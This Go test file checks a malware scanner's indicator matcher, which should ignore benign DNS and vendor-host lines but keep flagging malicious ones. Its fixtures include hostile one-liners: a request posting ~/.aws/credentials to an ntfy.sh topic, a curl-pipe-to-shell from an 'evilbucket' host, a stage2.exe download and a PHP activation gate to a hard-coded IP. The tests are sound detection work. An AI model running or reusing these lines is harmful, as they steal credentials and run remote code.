package iocscan

import (
	"strings"
	"testing"

	"github.com/vulnetix/malscan-engine/detect"
)

// Regression tests from the 2026-10-26 GCVE malware audit. IOC-STIX-MATCH was the largest
// false-positive rule there (10,922 matched lines on withdrawn records). The lines below are
// real withdrawn lines; the indicator values are put in the set as an external feed would
// carry them (no source:registry label), so only the matcher's own logic decides.

// auditMatcher builds a matcher over third-party indicators for the given values. Values that
// contain "://" are url indicators, dotted quads are ipv4, everything else is a domain.
func auditMatcher(values ...string) *Matcher {
	set := NewIndicatorSet()
	for _, v := range values {
		t := TypeDomain
		switch {
		case strings.Contains(v, "://"):
			t = TypeURL
		case strictIPv4(v):
			t = TypeIPv4
		}
		set.Add(&Indicator{Type: t, Value: v, Labels: []string{"malicious-activity", "source:threat-intel-blocklist"}})
	}
	return NewMatcher(set, 0)
}

// evidenceLines returns the 1-based line numbers that carry a ClassEvidence hit.
func evidenceLines(ev []Evidence) []int {
	var out []int
	seen := map[int]bool{}
	for _, e := range ev {
		if e.Class == detect.ClassContext || seen[e.LineNumber] {
			continue
		}
		seen[e.LineNumber] = true
		out = append(out, e.LineNumber)
	}
	return out
}

// Resolver, root-server, CHAOS-name and vendor-host lines from withdrawn records produce no
// evidence even when the feed lists every value on them.
func TestAuditDNSInfraLinesDoNotMatch(t *testing.T) {
	m := auditMatcher("8.26.56.26", "8.20.247.20", "198.41.0.4", "192.5.6.30", "94.140.14.140",
		"223.5.5.0", "version.bind", "id.server", "api.adoptium.net", "dashscope.aliyuncs.com")
	for _, line := range []string{
		`"8.26.56.26",      // Comodo`,
		`new PublicResolver('comodo', 'Comodo Secure DNS', '8.26.56.26', 'Global (anycast)'),`,
		`'a.root-servers.net' => '198.41.0.4',`,
		`->stubResponse('example.com', RecordType::NS, referral('com', 'a.gtld-servers.net', '192.5.6.30'), nameserver: $rootIp)`,
		`system bin/"kdig", "@94.140.14.140", "www.knot-dns.cz", "+quic"`,
		"const url = `https://dns.alidns.com/resolve?name=${encodeURIComponent(host)}&type=A&edns_client_subnet=223.5.5.0%2F24`;",
		`values = fp.chaos_txt(ip, port, "version.bind")`,
		`("id.server", false, DigOpt::Chaos("id.server.")),`,
		`"https://api.adoptium.net/v3/assets/latest/{JDK_MAJOR}/hotspot?os={os}&architecture={arch}&image_type=jdk&vendor=eclipse"`,
		`base_url="https://dashscope.aliyuncs.com/compatible-mode/v1",`,
	} {
		if got := evidenceLines(m.MatchText("pkg/src/lib.rs", line)); len(got) != 0 {
			t.Errorf("withdrawn line still yields evidence: %s", line)
		}
	}
}

// The verified-malware lines from the same audit still match: a hard-coded activation gate
// on a droplet IP (two composer records) and exfil URLs on paste / webhook services.
func TestAuditVerifiedMalwareLinesStillMatch(t *testing.T) {
	m := auditMatcher("206.189.81.181", "https://pastebin.com/api/api_post.php",
		"http://canarytokens.com/static/gru8rg2n4oxvn2u82l4jxftcy/contact.php")
	for _, line := range []string{
		`$gate = "http://206.189.81.181/check_activation/".$url;`,
		`$url = curl_init('http://206.189.81.181/'.'insert_domain/'.$url);`,
		`"https://pastebin.com/api/api_post.php",`,
		`_URL = "http://canarytokens.com/static/gru8rg2n4oxvn2u82l4jxftcy/contact.php"`,
	} {
		if got := evidenceLines(m.MatchText("pkg/src/index.php", line)); len(got) != 1 {
			t.Errorf("verified-malware line lost its evidence: %s", line)
		}
	}
}

// A bare host or front-end address of a multi-tenant platform cannot name a tenant, so the hit
// is corroboration only. Lines are from withdrawn audit records.
func TestAuditSharedHostHitsAreContext(t *testing.T) {
	m := auditMatcher("www.dropbox.com", "f005.backblazeb2.com", "ntfy.sh", "76.76.21.21",
		"140.82.121.4", "185.199.108.153")
	for _, line := range []string{
		`url "https://www.dropbox.com/download?build=#{version}&plat=mac&rtoken=&type=full&arch=arm64"`,
		`url "https://f005.backblazeb2.com/file/screenmemory/ScreenMemory.#{version}.dmg"`,
		`homepage "https://ntfy.sh/"`,
		`content: '76.76.21.21',`,
		`assert (status, records) == ("NOERROR", ["140.82.121.4"])`,
		`"resolved_hosts": ["185.199.108.153"],`,
	} {
		ev := m.MatchText("pkg/src/main.go", line)
		if len(ev) == 0 {
			t.Errorf("shared-host hit must still be recorded as corroboration: %s", line)
		}
		if got := evidenceLines(ev); len(got) != 0 {
			t.Errorf("shared-host hit must not be evidence: %s", line)
		}
	}
}

// A url indicator on a shared platform names one tenant's payload and keeps full weight, and a
// tenant-named host on the same provider is not shared.
func TestAuditSharedHostURLAndTenantHostsStillMatch(t *testing.T) {
	m := auditMatcher("https://www.dropbox.com/scl/fi/abc123/stage2.exe?dl=1",
		"https://ntfy.sh/exfil-topic-9f2", "evilbucket.s3.us-west-004.backblazeb2.com",
		"rocket-sense.duckdns.org")
	for _, line := range []string{
		`urllib.request.urlopen("https://www.dropbox.com/scl/fi/abc123/stage2.exe?dl=1")`,
		`requests.post("https://ntfy.sh/exfil-topic-9f2", data=open(os.path.expanduser("~/.aws/credentials")).read())`,
		`curl -fsSL https://evilbucket.s3.us-west-004.backblazeb2.com/x.sh | sh`,
		`url: Url::parse("https://rocket-sense.duckdns.org/api/v1")`,
	} {
		if got := evidenceLines(m.MatchText("pkg/setup.py", line)); len(got) != 1 {
			t.Errorf("tenant-specific indicator lost its evidence: %s", line)
		}
	}
}
